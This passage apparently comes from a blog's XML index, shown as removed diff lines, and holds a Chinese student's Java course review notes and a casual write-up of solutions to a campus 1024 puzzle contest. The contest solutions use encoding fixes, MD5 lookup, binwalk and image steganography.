-    <url>/2022/11/29/%E5%A4%A7%E4%BA%8C%E4%B8%8AJava%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>整理了一下ppt的内容，java程序设计课程的课件。</p>
-<h1>软件开发(Software Development)</h1>
-<h2 id="Agile-Methodologies（敏捷方法）">Agile Methodologies（敏捷方法）</h2>
-<p>这是一种快速部署应用程序的理念，优点包括：</p>
-<ul>
-<li>
-<p>persistent software delivery 持续提交软件</p>
-</li>
-<li>
-<p>increased stakeholder satisfaction 增加利益方的满意度</p>
-</li>
-<li>
-<p>inspect and adapt 检查调整</p>
-</li>
-<li>
-<p>welcome to changes at any stage 支持任意阶段修改</p>
-</li>
-<li>
-<p>design is important 设计至关重要</p>
-</li>
-<li>
-<p>daily interaction 日常互动</p>
-</li>
-</ul>
-<h2 id="版本控制（version-control）">版本控制（version control）</h2>
-<p>就是说需要一个git来控制一下版本，对多人合作很方便。而关于这个git的用法可以看看<a href="https://zthlly.github.io/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">这篇博客</a> 。</p>
-<h2 id="JVM">JVM</h2>
-<p>这里多说两句这个JVM，JVM（Java Virtucal Machine）是一个类似虚拟机的玩意，它运行在操作系统之下，通过与操作系统交互达到与硬件交互的目的。知道这个之后我们看看java文件怎么运行，首先写完一个.java文件之后通过编译器编译得到一个.class文件，然后通过类加载器把这个.class丢到JVM里面。这里再多提两句嘴，JVM内主要的五大块：方法区，堆是线程共享区域，有线程安全问题，栈和本地方法栈和计数器是独享区域，不存在线程安全问题。</p>
-<h1>Java语言基础</h1>
-<h2 id="语言基础语法">语言基础语法</h2>
-<p>这个去<a href="https://zthlly.github.io/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="si1v3r的狗窝捏">这里</a>看。</p>
-<h2 id="UML图">UML图</h2>
-<p>呃就是一个类的图形化表示，举个例子吧~</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/11/29/b41b30ebbe997a4f.png" alt=""></p>
-<h2 id="递归">递归</h2>
-<ul>
-<li>Mistakes like omitting the base case or writing the recursion step incorrectly can cause infinite recursion. <strong>小心无限递归爆栈</strong></li>
-<li>Recursive programs may result in exponential method calls <strong>递归可能导致指数级别调用</strong></li>
-<li>Each recursive method can be re-written using loops<strong>所有递归可重写为循环</strong></li>
-<li>Use recursive methods only if the problem is naturally recursive (i.e., to improve understanding) or there are performance benefits, or you need to impress in a job interview<strong>在必要的时候再用递归</strong></li>
-</ul>
-<h2 id="Concurrency-in-Java-（并发）">Concurrency in Java （并发）</h2>
-<p>Complex applications may use multithreading to speed up performance or user experience  <strong>复杂的程序会使用多线程来加速性能或用户体验</strong></p>
-<h3 id="Caveats-of-multithreading（多线程注意事项）">Caveats of multithreading（多线程注意事项）</h3>
-<ul>
-<li>Calling methods from multiple threads may have undesired and unexpected side effects (things may not happen in the expected order)   <strong>可能有副作用</strong></li>
-<li>Only primitive variables that are declared <strong>final</strong> can be shared across threads  <strong>只有声明final的变量可以跨线程共享</strong></li>
-<li>Using keyword <strong>synchronized</strong> will “lock” the method execution and force other threads to wait until the execution completes <strong>使用关键字同步将“锁定”方法的执行，并强制其他线程等待，直到执行完成</strong></li>
-<li>Thread can be in different states. After termination, thread can’t be started again (however, you can create a new thread). <strong>线程终止后不能再次启动，但是可以创建一个新的线程</strong></li>
-</ul>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/084e6b23e9a89d42.png" alt=""></p>
-<h2 id="Exception-handling-（异常处理）">Exception handling  （异常处理）</h2>
-<ul>
-<li>An <em>exception</em> is an event, which occurs during the execution of a program, that disrupts the normal flow of the program’s instructions</li>
-<li><strong>Exception handler</strong> is a block of code that can handle the exception</li>
-<li>Java allows to separate exception handling code from the normal code to improve the readability</li>
-<li>Exceptions are propagated across the call stack until exception handler is found so developer can choose at which level exceptions should be handled</li>
-<li>Each organisation will have its own house style on how to write and handle exceptions</li>
-</ul>
-<p>主要层次结构如下：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/aab3b03140ebf50d.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>大二课程</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>复习</tag>
-        <tag>校内课程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记录软院2022年1024解谜</title>
-    <url>/2022/11/08/%E8%AE%B0%E5%BD%95%E8%BD%AF%E9%99%A22022%E5%B9%B41024%E8%A7%A3%E8%B0%9C/</url>
-    <content><![CDATA[<p>首先是为什么写这篇文章，emmm，就当作是打了一次ctf写的wp吧，写都写了不如就发了(雾</p>
-<p>再讲一下这次1024的情况，我是在总共15题中做出9题，排名在12位，当然其中也有廖学长的提示(雾</p>
-<h4 id="第二题">第二题</h4>
-<p>第一题就不说了，兜兜转转搞半天原来就是直接点击链接进入拿到flag{hello1024}，害得我想了半天。</p>
-<p>第二题题面就很简单，经典的乱码，一眼看出文本编码问题，常见的编码出现乱码原因就是utf-8编码和gbk编码的问题，这里有一个简单的办法就是打开一个编辑器修改编码方式即可，由于正文肯定是使用utf-8编写，因此只需要在gbk编码下将内容录入编辑器再重新以utf-8打开文件即可。</p>
-<p>密文：鑷 劧鏁扮殑鍊硷紝淇濈暀灏忔暟鐐瑰悗 62 浣嶏紝涓嶇渷鐣ュ皬鏁扮偣</p>
-<p><img src="https://s2.loli.net/2022/11/09/WSFKalPjJif97Vc.png" alt="image1.png"></p>
-<p>得到正文，但是不全，这个时候就靠脑洞了…我当时还以为转错了…（逆天出题人，求一个什么什么数的小数点后62位的值，62位，基本肯定无限不循环小数，尝试${\Pi}$ 和自然对数e, 结果就是求e的小数点后64位。</p>
-<h4 id="第三题">第三题</h4>
-<p>题面：画家的密码</p>
-<p>题目：$a_1=1210a_2=321100a_3=?$</p>
-<p>也很简单，可是脑洞开的不够大了…（哭，结束之后才知道是自我描述数，反正当时是没想到…</p>
-<h4 id="第七题">第七题</h4>
-<p>解码问题，明文被加密，给出密文：627c279d7f747d9a8d2418c0f88b0960</p>
-<p>根据廖学长提醒，所有的md5加密的密文是具备固定长度的，因此看到该密文优先选择md5加密，随后找在线工具解就行，可是这题好像又有些网站解不出来，这里贴一个可以解的：<a href="https://www.t007.cn/">https://www.t007.cn/</a> 。其实网站倒是很多，多换几个就能解出来。</p>
-<h4 id="第八题">第八题</h4>
-<p>题面依然是简单至极：</p>
-<p><img src="https://s2.loli.net/2022/11/09/vM1I53uLPjr7JA2.png" alt="image2.png"></p>
-<p>搞得还以为是查看网页源代码，结果只要改一改google的黑夜模式就可以找到一串白色的文字…脑洞…</p>
-<h4 id="第十题">第十题</h4>
-<p>简单的图片隐写，先binwalk查看有没有隐藏的文件可以分离：</p>
-<p><img src="https://s2.loli.net/2022/11/09/yrxMLdfYcSqB35H.png" alt="image3.png"></p>
-<p>发现藏有一个zip，分离出来的文件是一个名字为flag的文件，但是常规方法打不开，这里我是用的ida打开，查找字符串就能找到flag,<img src="https://s2.loli.net/2022/11/09/iGOY5me6NXJp2gy.png" alt="image4.png"></p>
-<p>但是后来发现根本没必要，直接记事本打开，查找关键字flag或者关键符号&quot;{}&quot;即可找到flag，然后一眼字符串以==结尾，base64解码即可。</p>
-<h4 id="第十一题">第十一题</h4>
-<p>翻译一下得知要求最长公共子序列，直接网上搜一个代码跑一遍就行，答案不唯一选一个就好</p>
-<h4 id="第十三题">第十三题</h4>
-<p>题目：A,B,C,D  4个人组成的考古小队，在峡谷洞穴中触发陷阱，释放了僵尸，他们当即原路返回，可原路有条横跨峡谷的索桥。天色昏暗，只有一只灯，且如果有人要过桥，必须要提着灯过桥，桥上不可同时存在大于两个人的数量，或者当一群僵尸与人同时上桥时，桥便会断掉。 现在已知A过桥需要1min B:2min C:5min D:10min 而他们已经计算出僵尸群还有17min将赶上他们。怎么做才能安全脱险呢？请输出正确过程 (t代表灯，注意为规范答案，t放在表示人的字母的后面 请参照示例 示例过程：“CBt Bt BAt&quot; 代表“C与B一起过桥，他们拿着灯，（空格后面到下一个空格）代表返回过程：B带着灯回来，然后BAt指的是B跟A拿着灯过桥”)</p>
-<p>答案：ABt At CDt Bt ABt</p>
-<h4 id="第十四题">第十四题</h4>
-<p>图片隐写，由于给出了两个一样的图片，尝试stegsolve和盲水印解题，盲水印的话跑一个小脚本就行，得到一个名为out.png的图片，内容是一个篮球，上面有个100，就是答案，看得不清楚可以去stegsolve自己看看，脚本内容比较长，就不在这里放了。想要的可以网上搜一搜，很多的，<s>或者联系我捏</s>。</p>
-<p><img src="https://s2.loli.net/2022/11/09/C7qPRu4XeIMSj5V.png" alt="image5.png"></p>
-<h4 id="第十五题">第十五题</h4>
-<p>梅开二度，盲水印x2得到答案。</p>
-<p>结束！下班！来自一个啥也没干却很累的菜狗的碎碎念…</p>
-]]></content>
-      <categories>
-        <category>做题&amp;活动&amp;比赛の记录</category>
-      </categories>
-      <tags>
-        <tag>1024</tag>
-        <tag>图片隐写</tag>
-        <tag>逆天出题人</tag>
       </tags>
   </entry>
   <entry>
